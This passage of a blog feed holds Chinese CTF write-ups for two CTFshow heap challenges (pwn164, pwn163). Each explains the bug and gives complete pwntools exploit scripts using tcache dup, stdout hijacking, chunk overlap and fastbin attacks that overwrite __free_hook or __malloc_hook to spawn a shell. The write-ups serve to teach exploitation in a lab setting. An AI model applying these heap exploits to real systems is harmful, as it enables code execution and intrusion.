</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn164</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn164/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn164/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-pwn164-（tcache-dup）"><a href="#CTFshow-pwn164-（tcache-dup）" class="headerlink" title="CTFshow pwn164 （tcache dup）"></a>CTFshow pwn164 （tcache dup）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。<br>​        <strong>七剑下天山</strong> 遇上 <strong>双料特工</strong> ，简直无敌了。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="delete功能"><a href="#delete功能" class="headerlink" title="delete功能"></a>delete功能</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png" alt="image-20250530200643343"><br>1.典型的uaf 没有置空，但是ptr是哪来的?<br>2.继续看，add功能</p><h3 id="add功能"><a href="#add功能" class="headerlink" title="add功能"></a>add功能</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png" alt="image-20250530200820909"><br>1.ptr在这里，也就是刚刚分配的堆块的指针。<br>2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size&gt;&#x3D;size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。</p><h3 id="神秘选项"><a href="#神秘选项" class="headerlink" title="神秘选项"></a>神秘选项</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png" alt="image-20250530201556131"><br>1.一次置空ptr的机会</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.首先还是查看保护机制–全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png" alt="image-20250530210823813"></p><p>2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png" alt="image-20250530212136953"></p><p>3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置”&#x2F;bin&#x2F;sh;” 最后free() 就可以触发，getshell了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line">io,elf=loadfile(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28309</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content?\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tozero</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1433233&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>) </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># 填满tcache bins</span></span><br><span class="line">[free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x180</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x41</span>)+p8(<span class="number">0x60</span>)+p8(<span class="number">0xc7</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 劫持IO</span></span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>))</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3e82a0</span></span><br><span class="line"><span class="comment">#libc_base = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3e82a0</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">logvalue(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">logvalue(<span class="string">&quot;free&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">logvalue(<span class="string">&quot;system&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">tozero()</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x130</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x130</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">[free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&quot; &quot;</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x260</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(<span class="number">0x131</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x130</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x130</span>,<span class="string">b&quot;/bin/sh;&quot;</span>+p64(system))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tcachebin dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn163</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn163/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn163/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-pwn163（堆块重叠-fastbin-）"><a href="#CTFshow-pwn163（堆块重叠-fastbin-）" class="headerlink" title="CTFshow pwn163（堆块重叠|fastbin ）"></a>CTFshow pwn163（堆块重叠|fastbin ）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。<br>​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种<strong>盖周天之变，化吾为王</strong> 的感觉。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png" alt="image-20250529222118413"><br>1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。<br>2.在它的heaplist上会设置标志位检查这个堆块是否被free。<br>3.show的时候，会根据add时的size 进行打印内容。<br>4.add是采用calloc分配空间，初始化都为1。<br>5.free会把指针置空，size置0，标志置0。<br>6.并且，这是一道保护机制全开的题目。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。<br>2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。<br>3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line">io,elf=loadfile(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28248</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 0  全责哥</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 1  半责哥</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2  堆块重叠</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3  被重叠了</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 4  </span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x6a</span>,<span class="string">b&#x27;\x41&#x27;</span>*<span class="number">0x68</span>+<span class="string">b&#x27;\x21\x01&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recv(<span class="number">0x12</span>)</span><br><span class="line"><span class="comment">#libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3c3b78</span></span><br><span class="line">libcbase=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">logvalue(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook=libcbase+<span class="number">0x3c4b10</span></span><br><span class="line">realloc=libcbase+<span class="number">0x846c0</span></span><br><span class="line">logvalue(<span class="string">&quot;malloc_hook&quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget=libcbase+<span class="number">0x4526a</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>懒得写了，直接那官方的题解了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28145</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fill</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    A = io.recvline()</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line">Alloc(<span class="number">0x80</span>)</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line">padding = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload = padding*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">Fill(<span class="number">0</span>, payload)</span><br><span class="line">Fill(<span class="number">3</span>, padding)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">Fill(<span class="number">3</span>, payload)</span><br><span class="line">Alloc(<span class="number">0x80</span>)</span><br><span class="line">Free(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(Dump(<span class="number">2</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    </span><br><span class="line">Alloc(<span class="number">0x60</span>)</span><br><span class="line">Free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3c4aed</span>)</span><br><span class="line">Fill(<span class="number">2</span>, payload)</span><br><span class="line">Alloc(<span class="number">0x60</span>)</span><br><span class="line">Alloc(<span class="number">0x60</span>)</span><br><span class="line">one = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one)</span><br><span class="line">Fill(<span class="number">6</span>, payload)</span><br><span class="line">Alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆块重叠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn160</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn160/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn160/</url>
      
